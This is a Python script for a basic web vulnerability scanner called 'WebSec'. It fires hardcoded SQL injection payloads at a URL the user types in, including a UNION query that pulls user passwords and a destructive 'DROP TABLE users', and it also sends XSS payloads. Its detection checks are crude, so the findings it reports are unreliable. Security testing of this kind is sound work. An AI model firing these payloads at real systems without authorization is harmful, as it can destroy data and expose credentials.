import requests
import pyfiglet
from colorama import Fore, Style, init
import re
import socket
import os
import itertools
import threading
import time

init(autoreset=True)

class WebSec:
    def __init__(self, url):
        if not url.startswith(("http://", "https://")):
            self.url = "http://" + url
        else:
            self.url = url

    def print_custom_art(self):
        custom_art = """
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓███████▓▒░▒▓████████▓▒░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░ ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓██████▓▒░░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓█████████████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓██████▓▒░  
        """
        screen_width = os.get_terminal_size().columns
        lines = custom_art.strip().split('\n')
        for line in lines: 
            print(Fore.BLUE + line.center(screen_width) + Style.RESET_ALL)

    def test_sql_injection(self):
        payloads = [
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR '1'='1' AND SLEEP(5) --",
            "' UNION SELECT NULL, username, password FROM users --",
            "'; DROP TABLE users; --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
        ]

        print("\nTesting for SQL Injection...")
        found_vulnerability = False

        self.spinner_running = True
        spinner_thread = threading.Thread(target=self.spinner)
        spinner_thread.start()

        for payload in payloads:
            try:
                response = requests.get(self.url, params={'input': payload}, timeout=5)
                if response.status_code == 200 and "error" not in response.text.lower():
                    print(f"{Fore.RED}Potential SQL Injection vulnerability detected with payload: {payload}{Style.RESET_ALL}")
                    found_vulnerability = True
            except Exception as e:
                print(f"Error while testing payload '{payload}': {e}")

        self.spinner_running = False
        spinner_thread.join()

        if not found_vulnerability:
            print(f"{Fore.GREEN}No SQL Injection vulnerabilities found.{Style.RESET_ALL}")
        print("SQL Injection testing completed.")

    def test_xss(self):
        payloads = [
            "<script>alert('XSS');</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "'><script>alert('XSS')</script>",
            "<body onload=alert('XSS')>",
            "<input type='text' value='\";alert(1);//'>"
        ]

        print("\nTesting for XSS...")
        found_vulnerability = False

        self.spinner_running = True
        spinner_thread = threading.Thread(target=self.spinner)
        spinner_thread.start()

        for payload in payloads:
            try:
                response = requests.get(self.url, params={'input': payload}, timeout=5)

                if response.status_code == 200:
                    if payload in response.text or "alert(1)" in response.text:
                        print(f"{Fore.RED}Potential XSS vulnerability detected with payload: {payload}{Style.RESET_ALL}")
                        found_vulnerability = True
            except Exception as e:
                print(f"Error while testing payload '{payload}': {e}")

        self.spinner_running = False
        spinner_thread.join()

        if not found_vulnerability:
            print(f"{Fore.GREEN}No XSS vulnerabilities found.{Style.RESET_ALL}")
        print("XSS testing completed.")

    def spinner(self):
        spinner_chars = ['|', '/', '-', '\\']
        idx = 0
        while self.spinner_running:
            print(Fore.YELLOW + spinner_chars[idx % len(spinner_chars)] + " Testing...", end='\r')
            idx += 1
            time.sleep(0.1)
        print(" " * 20, end='\r')  

if __name__ == "__main__":
    tester = WebSec("http://example.com") 
    tester.print_custom_art() 
    
    while True:
        try:
            url = input("Enter the URL of the web application to test : ")
            tester = WebSec(url) 
            host = tester.url.split("://")[-1].split("/")[0].split(":")[0]
            ip_address = socket.gethostbyname(host)
            print(f"IP Address: {ip_address}")

            break
        except ValueError as e:
            print(f"{Fore.RED}{e}{Style.RESET_ALL}")

    tester.test_sql_injection()
    tester.test_xss()
